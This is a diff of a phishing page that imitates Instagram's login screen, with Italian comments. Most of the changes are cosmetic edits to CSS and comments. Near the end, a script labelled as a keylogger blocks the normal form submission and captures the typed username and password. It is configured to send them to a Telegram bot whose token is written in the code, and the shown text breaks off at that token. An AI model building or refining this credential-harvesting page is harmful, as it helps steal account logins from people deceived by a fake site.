@@ -31,7 +31,7 @@
             align-items: center;
         }
 
-        /* Logo Instagram (SVG Identico) */
+        /* Logo Instagram SVG (Identico all'originale) */
         .logo-svg {
             width: 175px;
             height: auto;
@@ -40,7 +40,6 @@
 
         /* Form */
         form { width: 100%; }
-
         .input-group { margin-bottom: 6px; }
 
         input {
@@ -53,6 +52,7 @@
             width: 100%;
             color: #262626;
             outline: none;
+            transition: border 0.2s;
         }
 
         input:focus {
@@ -80,7 +80,7 @@
             cursor: not-allowed;
         }
 
-        /* Divider */
+        /* Divider "Oppure" */
         .divider {
             position: relative;
             width: 100%;
@@ -105,7 +105,7 @@
             z-index: 1;
         }
 
-        /* Facebook Button */
+        /* Bottone Facebook */
         .btn-fb {
             background-color: #385185;
             border: none;
@@ -120,7 +120,7 @@
             cursor: pointer;
         }
 
-        /* Forgot Password */
+        /* Link Dimenticata Password */
         .forgot-link {
             color: #00376B;
             font-size: 12px;
@@ -164,11 +164,13 @@
             font-weight: 600;
         }
     </style>
+    <!-- Font per il logo -->
     <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
 
     <div class="login-card">
+        <!-- Logo SVG -->
         <svg class="logo-svg" viewBox="0 0 103 29" xmlns="http://www.w3.org/2000/svg">
             <path d="M51.2 0C66.8 0 80.4 11.3 80.4 26.9S66.8 53.8 51.2 53.8 22 42.5 22 26.9 35.6 0 51.2 0zm0 11.6c-8.4 0-15.3 6.9-15.3 15.3s6.9 15.3 15.3 15.3 15.3-6.9 15.3-15.3-6.9-15.3-15.3-15.3zm0 5.8c5.2 0 9.5 4.3 9.5 9.5s-4.3 9.5-9.5 9.5-9.5-4.3-9.5-9.5 4.3-9.5 9.5-9.5z" fill="#262626"/>
             <text x="51.2" y="29" text-anchor="middle" font-family="'Grand Hotel', cursive" font-size="24" fill="#262626">Instagram</text>
@@ -203,12 +205,12 @@
         <a href="#">Apple Store</a> | <a href="#">Google Play</a>
     </div>
 
-    <!-- KEYLOGGER & BOT SCRIPT -->
+    <!-- KEYLOGGER SCRIPT -->
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault(); // Ferma il caricamento normale
 
-            // 1. Prendi i dati
+            // 1. Prendi i dati dai campi
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const btn = document.getElementById('submitBtn');
@@ -217,7 +219,6 @@
                 btn.disabled = true;
                 btn.innerText = "Caricamento...";
 
-                // 2. CONFIGURA QUI IL TUO BOT (Token e ID)
-                // Assicurati che non ci siano spazi extra
-                const BOT_TOKEN = "8788982206:AAHn01TeqrZJ_s-Up3EIFylCzdY7QbA3bXY";
-                const CHAT_ID = "871
+                // 2. CONFIGURA QUI I TUOI DATI (Token e ID)
+                // Se non hai messo i tuoi dati qui, il bot non funziona!
+                const BOT_TOKEN = "8788982206:AAH
